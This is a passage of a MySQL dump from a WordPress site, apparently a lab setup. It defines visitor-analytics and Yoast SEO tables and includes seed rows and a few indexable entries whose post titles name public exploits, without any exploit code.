(2, 'hourWiseVisitors', '2022-10-23 00:00:00', 'a:5:{i:0;a:2:{s:4:\"hour\";s:2:\"14\";s:8:\"visitors\";s:1:\"3\";}i:1;a:2:{s:4:\"hour\";s:2:\"15\";s:8:\"visitors\";s:1:\"3\";}i:2;a:2:{s:4:\"hour\";s:2:\"16\";s:8:\"visitors\";s:3:\"607\";}i:3;a:2:{s:4:\"hour\";s:2:\"17\";s:8:\"visitors\";s:1:\"4\";}i:4;a:2:{s:4:\"hour\";s:2:\"18\";s:8:\"visitors\";s:1:\"1\";}}', '+01:00'),
(3, 'hourWiseFirstVisitors', '2022-10-23 00:00:00', 'a:3:{i:0;a:2:{s:4:\"hour\";s:2:\"14\";s:8:\"visitors\";s:1:\"1\";}i:1;a:2:{s:4:\"hour\";s:2:\"15\";s:8:\"visitors\";s:1:\"5\";}i:2;a:2:{s:4:\"hour\";s:2:\"16\";s:8:\"visitors\";s:3:\"570\";}}', '+01:00');

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_datewisebounce`
--

CREATE TABLE `wp_wsm_datewisebounce` (
  `recordDate` varchar(10) DEFAULT NULL,
  `bounce` bigint(21) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_datewisebouncerate`
--

CREATE TABLE `wp_wsm_datewisebouncerate` (
  `recordDate` varchar(10) DEFAULT NULL,
  `bounce` bigint(21) DEFAULT NULL,
  `pageViews` decimal(42,0) DEFAULT NULL,
  `visitors` bigint(21) DEFAULT NULL,
  `bRatePageViews` decimal(27,4) DEFAULT NULL,
  `bRateVisitors` decimal(27,4) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_datewisefirstvisitors`
--

CREATE TABLE `wp_wsm_datewisefirstvisitors` (
  `recordDate` varchar(10) DEFAULT NULL,
  `visitors` bigint(21) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_datewisepageviews`
--

CREATE TABLE `wp_wsm_datewisepageviews` (
  `recordDate` varchar(10) DEFAULT NULL,
  `pageViews` decimal(42,0) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_datewisevisitors`
--

CREATE TABLE `wp_wsm_datewisevisitors` (
  `recordDate` varchar(10) DEFAULT NULL,
  `visitors` bigint(21) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_datewise_report`
--

CREATE TABLE `wp_wsm_datewise_report` (
  `id` int(10) UNSIGNED NOT NULL,
  `date` date NOT NULL,
  `normal` int(2) NOT NULL DEFAULT 0,
  `hour` int(2) NOT NULL DEFAULT 0,
  `search_engine` varchar(255) NOT NULL DEFAULT '',
  `browser` int(2) NOT NULL DEFAULT 0,
  `screen` int(2) NOT NULL DEFAULT 0,
  `country` int(3) NOT NULL DEFAULT 0,
  `city` varchar(255) NOT NULL DEFAULT '',
  `operating_system` int(2) NOT NULL DEFAULT 0,
  `url_id` int(11) NOT NULL DEFAULT 0,
  `total_page_views` int(11) NOT NULL DEFAULT 0,
  `total_visitors` int(11) NOT NULL DEFAULT 0,
  `total_first_time_visitors` int(11) NOT NULL DEFAULT 0,
  `total_bounce` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_hourwisebounce`
--

CREATE TABLE `wp_wsm_hourwisebounce` (
  `hour` int(2) DEFAULT NULL,
  `bounce` bigint(21) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_hourwisebouncerate`
--

CREATE TABLE `wp_wsm_hourwisebouncerate` (
  `hour` int(2) DEFAULT NULL,
  `bounce` bigint(21) DEFAULT NULL,
  `pageViews` decimal(42,0) DEFAULT NULL,
  `visitors` bigint(21) DEFAULT NULL,
  `bRatePageViews` decimal(27,4) DEFAULT NULL,
  `bRateVisitors` decimal(27,4) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_hourwisefirstvisitors`
--

CREATE TABLE `wp_wsm_hourwisefirstvisitors` (
  `hour` int(2) DEFAULT NULL,
  `visitors` bigint(21) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_hourwisepageviews`
--

CREATE TABLE `wp_wsm_hourwisepageviews` (
  `hour` int(2) DEFAULT NULL,
  `pageViews` decimal(42,0) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_hourwisevisitors`
--

CREATE TABLE `wp_wsm_hourwisevisitors` (
  `hour` int(2) DEFAULT NULL,
  `visitors` bigint(21) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_loguniquevisit`
--

CREATE TABLE `wp_wsm_loguniquevisit` (
  `id` bigint(10) UNSIGNED NOT NULL,
  `siteId` int(10) UNSIGNED NOT NULL,
  `visitorId` varchar(20) NOT NULL,
  `visitLastActionTime` datetime NOT NULL,
  `configId` varchar(20) NOT NULL,
  `ipAddress` varchar(16) NOT NULL,
  `userId` varchar(200) DEFAULT NULL,
  `firstActionVisitTime` datetime NOT NULL,
  `daysSinceFirstVisit` smallint(5) UNSIGNED DEFAULT NULL,
  `returningVisitor` tinyint(1) DEFAULT NULL,
  `visitCount` int(11) UNSIGNED NOT NULL,
  `visitEntryURLId` int(11) UNSIGNED DEFAULT NULL,
  `visitExitURLId` int(11) UNSIGNED DEFAULT 0,
  `visitTotalActions` int(11) UNSIGNED DEFAULT NULL,
  `refererUrlId` int(11) DEFAULT NULL,
  `browserLang` varchar(20) DEFAULT NULL,
  `browserId` int(11) UNSIGNED DEFAULT NULL,
  `deviceType` varchar(20) DEFAULT NULL,
  `oSystemId` int(11) UNSIGNED DEFAULT NULL,
  `currentLocalTime` time DEFAULT NULL,
  `daysSinceLastVisit` smallint(5) UNSIGNED DEFAULT NULL,
  `totalTimeVisit` int(11) UNSIGNED NOT NULL,
  `resolutionId` int(11) UNSIGNED DEFAULT NULL,
  `cookie` tinyint(1) DEFAULT NULL,
  `director` tinyint(1) DEFAULT NULL,
  `flash` tinyint(1) DEFAULT NULL,
  `gears` tinyint(1) DEFAULT NULL,
  `java` tinyint(1) DEFAULT NULL,
  `pdf` tinyint(1) DEFAULT NULL,
  `quicktime` tinyint(1) DEFAULT NULL,
  `realplayer` tinyint(1) DEFAULT NULL,
  `silverlight` tinyint(1) DEFAULT NULL,
  `windowsmedia` tinyint(1) DEFAULT NULL,
  `city` varchar(255) DEFAULT NULL,
  `countryId` int(3) UNSIGNED NOT NULL,
  `latitude` decimal(9,6) DEFAULT NULL,
  `longitude` decimal(9,6) DEFAULT NULL,
  `regionId` tinyint(2) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `wp_wsm_loguniquevisit`
--

INSERT INTO `wp_wsm_loguniquevisit` (`id`, `siteId`, `visitorId`, `visitLastActionTime`, `configId`, `ipAddress`, `userId`, `firstActionVisitTime`, `daysSinceFirstVisit`, `returningVisitor`, `visitCount`, `visitEntryURLId`, `visitExitURLId`, `visitTotalActions`, `refererUrlId`, `browserLang`, `browserId`, `deviceType`, `oSystemId`, `currentLocalTime`, `daysSinceLastVisit`, `totalTimeVisit`, `resolutionId`, `cookie`, `director`, `flash`, `gears`, `java`, `pdf`, `quicktime`, `realplayer`, `silverlight`, `windowsmedia`, `city`, `countryId`, `latitude`, `longitude`, `regionId`) VALUES
(1, 0, '0', '2022-10-23 13:58:52', '4aad0d9ff11812eb', '172.19.0.1', '0', '2022-10-23 13:58:52', 0, 0, 1, 0, 1, 1, 0, 'en-US', 0, '0', 0, '13:58:49', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '', 0, '0.000000', '0.000000', 0);

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_logvisit`
--

CREATE TABLE `wp_wsm_logvisit` (
  `id` bigint(10) UNSIGNED NOT NULL,
  `siteId` int(10) UNSIGNED NOT NULL,
  `visitorId` varchar(20) NOT NULL,
  `visitId` bigint(10) UNSIGNED NOT NULL,
  `refererUrlId` int(10) UNSIGNED DEFAULT 0,
  `keyword` varchar(200) DEFAULT NULL,
  `serverTime` datetime NOT NULL,
  `timeSpentRef` int(11) UNSIGNED NOT NULL,
  `URLId` int(10) UNSIGNED DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `wp_wsm_logvisit`
--

INSERT INTO `wp_wsm_logvisit` (`id`, `siteId`, `visitorId`, `visitId`, `refererUrlId`, `keyword`, `serverTime`, `timeSpentRef`, `URLId`) VALUES
(1, 0, '0', 1, 0, 'https://0', '2022-10-23 13:58:49', 0, 2);

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_monthlydailyreport`
--

CREATE TABLE `wp_wsm_monthlydailyreport` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(50) NOT NULL,
  `reportMonthYear` varchar(50) NOT NULL,
  `content` text NOT NULL,
  `timezone` varchar(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_monthwisebounce`
--

CREATE TABLE `wp_wsm_monthwisebounce` (
  `recordMonth` varchar(7) DEFAULT NULL,
  `bounce` bigint(21) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_monthwisebouncerate`
--

CREATE TABLE `wp_wsm_monthwisebouncerate` (
  `recordMonth` varchar(7) DEFAULT NULL,
  `bounce` bigint(21) DEFAULT NULL,
  `pageViews` decimal(42,0) DEFAULT NULL,
  `visitors` bigint(21) DEFAULT NULL,
  `bRatePageViews` decimal(27,4) DEFAULT NULL,
  `bRateVisitors` decimal(27,4) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_monthwisefirstvisitors`
--

CREATE TABLE `wp_wsm_monthwisefirstvisitors` (
  `recordMonth` varchar(7) DEFAULT NULL,
  `visitors` bigint(21) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_monthwisepageviews`
--

CREATE TABLE `wp_wsm_monthwisepageviews` (
  `recordMonth` varchar(7) DEFAULT NULL,
  `pageViews` decimal(42,0) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_monthwisevisitors`
--

CREATE TABLE `wp_wsm_monthwisevisitors` (
  `recordMonth` varchar(7) DEFAULT NULL,
  `visitors` bigint(21) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_monthwise_report`
--

CREATE TABLE `wp_wsm_monthwise_report` (
  `id` int(10) UNSIGNED NOT NULL,
  `date` date NOT NULL,
  `normal` int(2) NOT NULL DEFAULT 0,
  `hour` int(2) NOT NULL DEFAULT 0,
  `search_engine` varchar(255) NOT NULL DEFAULT '',
  `browser` int(2) NOT NULL DEFAULT 0,
  `screen` int(2) NOT NULL DEFAULT 0,
  `country` int(3) NOT NULL DEFAULT 0,
  `city` varchar(255) NOT NULL DEFAULT '',
  `operating_system` int(2) NOT NULL DEFAULT 0,
  `url_id` int(11) NOT NULL DEFAULT 0,
  `total_page_views` int(11) NOT NULL DEFAULT 0,
  `total_visitors` int(11) NOT NULL DEFAULT 0,
  `total_first_time_visitors` int(11) NOT NULL DEFAULT 0,
  `total_bounce` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_osystems`
--

CREATE TABLE `wp_wsm_osystems` (
  `id` tinyint(2) UNSIGNED NOT NULL,
  `name` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `wp_wsm_osystems`
--

INSERT INTO `wp_wsm_osystems` (`id`, `name`) VALUES
(1, 'Windows 98'),
(2, 'Windows CE'),
(3, 'Linux'),
(4, 'Unix'),
(5, 'Windows 2000'),
(6, 'Windows XP'),
(7, 'Windows 8'),
(8, 'Windows 10'),
(9, 'Mac OS'),
(10, 'Android'),
(11, 'IOS');

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_pageviews`
--

CREATE TABLE `wp_wsm_pageviews` (
  `visitId` bigint(10) UNSIGNED DEFAULT NULL,
  `URLId` int(10) UNSIGNED DEFAULT NULL,
  `keyword` varchar(200) DEFAULT NULL,
  `refererUrlId` int(10) UNSIGNED DEFAULT NULL,
  `countryId` int(3) UNSIGNED DEFAULT NULL,
  `regionId` tinyint(2) DEFAULT NULL,
  `totalViews` bigint(21) DEFAULT NULL,
  `visitLastActionTime` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_regions`
--

CREATE TABLE `wp_wsm_regions` (
  `id` tinyint(1) UNSIGNED NOT NULL,
  `code` char(2) NOT NULL COMMENT 'Region code',
  `name` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `wp_wsm_regions`
--

INSERT INTO `wp_wsm_regions` (`id`, `code`, `name`) VALUES
(1, 'AF', 'Africa'),
(2, 'AN', 'Antarctica'),
(3, 'AS', 'Asia'),
(4, 'EU', 'Europe'),
(5, 'NA', 'North America'),
(6, 'OC', 'Oceania'),
(7, 'SA', 'South America');

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_resolutions`
--

CREATE TABLE `wp_wsm_resolutions` (
  `id` tinyint(2) UNSIGNED NOT NULL,
  `name` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `wp_wsm_resolutions`
--

INSERT INTO `wp_wsm_resolutions` (`id`, `name`) VALUES
(1, '640x480'),
(2, '800x600'),
(3, '960x720'),
(4, '1024x768'),
(5, '1280x960'),
(6, '1400x1050'),
(7, '1440x1080'),
(8, '1600x1200'),
(9, '1856x1392'),
(10, '1920x1440'),
(11, '2048x1536'),
(12, '1280x800'),
(13, '1440x900'),
(14, '1680x1050'),
(15, '1920x1200'),
(16, '2560x1600'),
(17, '1024x576'),
(18, '1152x648'),
(19, '1280x720'),
(20, '1366x768'),
(21, '1600x900'),
(22, '1920x1080'),
(23, '2560x1440'),
(24, '3840x2160'),
(25, '3440x1440'),
(26, '1718x1343');

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_searchengines`
--

CREATE TABLE `wp_wsm_searchengines` (
  `id` tinyint(2) UNSIGNED NOT NULL,
  `name` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `wp_wsm_searchengines`
--

INSERT INTO `wp_wsm_searchengines` (`id`, `name`) VALUES
(1, 'Google'),
(2, 'Bing'),
(3, 'Yahoo'),
(4, 'Baidu'),
(5, 'AOL'),
(6, 'Ask'),
(7, 'Excite'),
(8, 'Duck Duck Go'),
(9, 'WolframAlpha'),
(10, 'Yandex'),
(11, 'Lycos'),
(12, 'Chacha');

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_toolbars`
--

CREATE TABLE `wp_wsm_toolbars` (
  `id` tinyint(2) UNSIGNED NOT NULL,
  `name` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `wp_wsm_toolbars`
--

INSERT INTO `wp_wsm_toolbars` (`id`, `name`) VALUES
(1, 'Alexa'),
(2, 'AOL'),
(3, 'Bing'),
(4, 'Data'),
(5, 'Google'),
(6, 'Kiwee'),
(7, 'Mirar'),
(8, 'Windows Live'),
(9, 'Yahoo');

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_uniquevisitors`
--

CREATE TABLE `wp_wsm_uniquevisitors` (
  `id` bigint(10) UNSIGNED DEFAULT NULL,
  `visitorId` varchar(20) DEFAULT NULL,
  `totalTimeVisit` decimal(33,0) DEFAULT NULL,
  `firstVisitTime` datetime DEFAULT NULL,
  `refererUrlId` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_url_log`
--

CREATE TABLE `wp_wsm_url_log` (
  `id` int(10) UNSIGNED NOT NULL,
  `pageId` int(10) UNSIGNED DEFAULT NULL,
  `title` text DEFAULT NULL,
  `hash` varchar(20) NOT NULL,
  `protocol` varchar(10) NOT NULL,
  `url` text DEFAULT NULL,
  `searchEngine` int(2) UNSIGNED DEFAULT NULL,
  `toolBar` int(2) UNSIGNED DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `wp_wsm_url_log`
--

INSERT INTO `wp_wsm_url_log` (`id`, `pageId`, `title`, `hash`, `protocol`, `url`, `searchEngine`, `toolBar`) VALUES
(1, 0, '', '098f6bcd4621d373', '://', 'test', 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_visitorinfo`
--

CREATE TABLE `wp_wsm_visitorinfo` (
  `visitId` bigint(10) UNSIGNED DEFAULT NULL,
  `userId` varchar(200) DEFAULT NULL,
  `serverTime` datetime DEFAULT NULL,
  `visitLastActionTime` datetime DEFAULT NULL,
  `urlId` int(10) UNSIGNED DEFAULT NULL,
  `hits` bigint(21) DEFAULT NULL,
  `title` text DEFAULT NULL,
  `url` mediumtext DEFAULT NULL,
  `refUrl` mediumtext DEFAULT NULL,
  `visitorId` varchar(20) DEFAULT NULL,
  `ipAddress` varchar(16) DEFAULT NULL,
  `city` varchar(255) DEFAULT NULL,
  `alpha2Code` varchar(2) DEFAULT NULL,
  `country` varchar(255) DEFAULT NULL,
  `deviceType` varchar(20) DEFAULT NULL,
  `browser` varchar(255) DEFAULT NULL,
  `osystem` varchar(255) DEFAULT NULL,
  `latitude` decimal(9,6) DEFAULT NULL,
  `longitude` decimal(9,6) DEFAULT NULL,
  `resolution` varchar(255) DEFAULT NULL,
  `searchEngine` varchar(255) DEFAULT NULL,
  `toolBar` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_yearlymonthlyreport`
--

CREATE TABLE `wp_wsm_yearlymonthlyreport` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(50) NOT NULL,
  `reportYear` varchar(10) NOT NULL,
  `content` text NOT NULL,
  `timezone` varchar(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_yearwise_report`
--

CREATE TABLE `wp_wsm_yearwise_report` (
  `id` int(10) UNSIGNED NOT NULL,
  `date` date NOT NULL,
  `normal` int(2) NOT NULL DEFAULT 0,
  `hour` int(2) NOT NULL DEFAULT 0,
  `search_engine` varchar(255) NOT NULL DEFAULT '',
  `browser` int(2) NOT NULL DEFAULT 0,
  `screen` int(2) NOT NULL DEFAULT 0,
  `country` int(3) NOT NULL DEFAULT 0,
  `city` varchar(255) NOT NULL DEFAULT '',
  `operating_system` int(2) NOT NULL DEFAULT 0,
  `url_id` int(11) NOT NULL DEFAULT 0,
  `total_page_views` int(11) NOT NULL DEFAULT 0,
  `total_visitors` int(11) NOT NULL DEFAULT 0,
  `total_first_time_visitors` int(11) NOT NULL DEFAULT 0,
  `total_bounce` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

-- --------------------------------------------------------

--
-- Table structure for table `wp_yoast_indexable`
--

CREATE TABLE `wp_yoast_indexable` (
  `id` int(11) UNSIGNED NOT NULL,
  `permalink` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `permalink_hash` varchar(40) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `object_id` bigint(20) DEFAULT NULL,
  `object_type` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL,
  `object_sub_type` varchar(32) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `author_id` bigint(20) DEFAULT NULL,
  `post_parent` bigint(20) DEFAULT NULL,
  `title` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` mediumtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `breadcrumb_title` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `post_status` varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `is_public` tinyint(1) DEFAULT NULL,
  `is_protected` tinyint(1) DEFAULT 0,
  `has_public_posts` tinyint(1) DEFAULT NULL,
  `number_of_pages` int(11) UNSIGNED DEFAULT NULL,
  `canonical` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `primary_focus_keyword` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `primary_focus_keyword_score` int(3) DEFAULT NULL,
  `readability_score` int(3) DEFAULT NULL,
  `is_cornerstone` tinyint(1) DEFAULT 0,
  `is_robots_noindex` tinyint(1) DEFAULT 0,
  `is_robots_nofollow` tinyint(1) DEFAULT 0,
  `is_robots_noarchive` tinyint(1) DEFAULT 0,
  `is_robots_noimageindex` tinyint(1) DEFAULT 0,
  `is_robots_nosnippet` tinyint(1) DEFAULT 0,
  `twitter_title` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `twitter_image` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `twitter_description` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `twitter_image_id` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `twitter_image_source` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `open_graph_title` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `open_graph_description` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `open_graph_image` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `open_graph_image_id` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `open_graph_image_source` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `open_graph_image_meta` mediumtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `link_count` int(11) DEFAULT NULL,
  `incoming_link_count` int(11) DEFAULT NULL,
  `prominent_words_version` int(11) UNSIGNED DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `blog_id` bigint(20) NOT NULL DEFAULT 1,
  `language` varchar(32) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `region` varchar(32) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `schema_page_type` varchar(64) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `schema_article_type` varchar(64) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `has_ancestors` tinyint(1) DEFAULT 0,
  `estimated_reading_time_minutes` int(11) DEFAULT NULL,
  `version` int(11) DEFAULT 1,
  `object_last_modified` datetime DEFAULT NULL,
  `object_published_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_yoast_indexable`
--

INSERT INTO `wp_yoast_indexable` (`id`, `permalink`, `permalink_hash`, `object_id`, `object_type`, `object_sub_type`, `author_id`, `post_parent`, `title`, `description`, `breadcrumb_title`, `post_status`, `is_public`, `is_protected`, `has_public_posts`, `number_of_pages`, `canonical`, `primary_focus_keyword`, `primary_focus_keyword_score`, `readability_score`, `is_cornerstone`, `is_robots_noindex`, `is_robots_nofollow`, `is_robots_noarchive`, `is_robots_noimageindex`, `is_robots_nosnippet`, `twitter_title`, `twitter_image`, `twitter_description`, `twitter_image_id`, `twitter_image_source`, `open_graph_title`, `open_graph_description`, `open_graph_image`, `open_graph_image_id`, `open_graph_image_source`, `open_graph_image_meta`, `link_count`, `incoming_link_count`, `prominent_words_version`, `created_at`, `updated_at`, `blog_id`, `language`, `region`, `schema_page_type`, `schema_article_type`, `has_ancestors`, `estimated_reading_time_minutes`, `version`, `object_last_modified`, `object_published_at`) VALUES
(1, 'http://exp-2-2/author/adminlol/', '29:8ff68310f4747d7fbe3bc27442b030fd', 1, 'user', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, 'https://0.gravatar.com/avatar/c5002bfc8e413261a2e4b0cc902b827c?s=500&d=mm&r=g', NULL, NULL, 'gravatar-image', NULL, NULL, 'https://0.gravatar.com/avatar/c5002bfc8e413261a2e4b0cc902b827c?s=500&d=mm&r=g', NULL, 'gravatar-image', NULL, NULL, NULL, NULL, '2022-10-23 08:27:28', '2022-10-23 16:13:23', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 16:13:23', '2022-02-18 08:13:53'),
(2, 'http://exp-2-2/?page_id=2', '23:f202be9dd803967aa76ce561ab0bf1d3', 2, 'post', 'page', 1, 0, NULL, NULL, 'Sample Page', 'trash', 0, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2022-10-23 08:27:28', '2022-10-23 15:30:18', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 08:22:31', '2022-10-23 07:29:40'),
(3, 'http://exp-2-2/?page_id=3', '23:77b51062cc3e5f6ffb53d74d25a23f45', 3, 'post', 'page', 1, 0, NULL, NULL, 'Privacy Policy', 'trash', 0, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2022-10-23 08:27:28', '2022-10-23 15:30:18', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 08:22:36', '2022-10-23 07:29:40'),
(4, 'http://exp-2-2/2022/02/18/qdpm-9-1-remote-code-execution-rce-authenticated-v2/', '76:1bf190c61abd9841adb4b0106fc7b81c', 7, 'post', 'post', 1, 0, NULL, NULL, 'qdPM 9.1 &#8211; Remote Code Execution (RCE) (Authenticated) (v2)', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 08:27:28', '2022-10-23 15:30:18', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 08:42:31', '2022-02-18 08:13:53'),
(5, 'http://exp-2-2/2022/04/29/cve-2018-12613/', '39:afc7cd259a7f1e029386b34f887a3653', 10, 'post', 'post', 1, 0, NULL, NULL, 'CVE-2018-12613', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 08:27:28', '2022-10-23 15:30:18', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 08:42:52', '2022-04-29 08:16:41'),
(6, 'http://exp-2-2/2022/05/07/wordpress-4-9-6-arbitrary-file-deletion/', '64:05082ca1d605df270a32c444993093ff', 12, 'post', 'post', 1, 0, NULL, NULL, 'WordPress 4.9.6 &#8211; Arbitrary File Deletion', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 08:27:28', '2022-10-23 15:30:18', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 08:43:08', '2022-05-07 08:17:48'),
(7, 'http://exp-2-2/2022/10/23/rocket-chat-3-12-1-nosql-injection-to-rce/', '66:e9ecab575cd152a5fe4a65ed78fa1833', 14, 'post', 'post', 1, 0, NULL, NULL, 'Rocket.Chat 3.12.1 &#8211; NoSQL Injection to RCE', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 08:27:28', '2022-10-23 15:30:18', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 08:23:40', '2022-10-23 08:20:28'),
